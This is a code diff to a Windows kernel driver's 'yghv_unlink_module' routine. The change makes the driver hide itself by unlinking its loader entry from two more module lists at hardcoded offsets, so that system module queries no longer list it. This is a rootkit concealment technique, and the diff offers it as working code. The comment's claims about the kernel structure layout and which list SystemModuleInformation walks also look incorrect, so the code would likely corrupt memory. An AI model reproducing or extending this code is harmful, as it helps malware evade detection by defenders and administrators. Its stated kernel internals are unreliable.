@@ -66,10 +66,36 @@ static void yghv_unlink_module(PDRIVER_OBJECT DriverObject) {
             le->Flink = le;
             le->Blink = le;
 
+            /*
+             * 9.599: also unlink from InMemoryOrderLinks (+0x10) and
+             * InInitializationOrderLinks (+0x20).  On Windows 10 the three
+             * LIST_ENTRY fields sit at 0x00, 0x10, 0x20 in KLDR_DATA_TABLE_ENTRY;
+             * the offsets are stable across 19041 / 26100.  Unlinking only the
+             * first list leaves the module visible to NtQuerySystemInformation
+             * (SystemModuleInformation walks InInitializationOrderLinks).
+             */
+            {
+                PLIST_ENTRY memL = (PLIST_ENTRY)((PUCHAR)entry + 0x10);
+                prev = memL->Blink;
+                next = memL->Flink;
+                prev->Flink = next;
+                next->Blink = prev;
+                memL->Flink = memL;
+                memL->Blink = memL;
+
+                PLIST_ENTRY initL = (PLIST_ENTRY)((PUCHAR)entry + 0x20);
+                prev = initL->Blink;
+                next = initL->Flink;
+                prev->Flink = next;
+                next->Blink = prev;
+                initL->Flink = initL;
+                initL->Blink = initL;
+            }
+
             RtlZeroMemory(&entry->BaseDllName, sizeof(entry->BaseDllName));
             RtlZeroMemory(&entry->FullDllName, sizeof(entry->FullDllName));
 
-            LOG_INFO("yghv_unlink: removed from the load-order list");
+            LOG_INFO("yghv_unlink: removed from all three module lists");
             return;
         }
     }
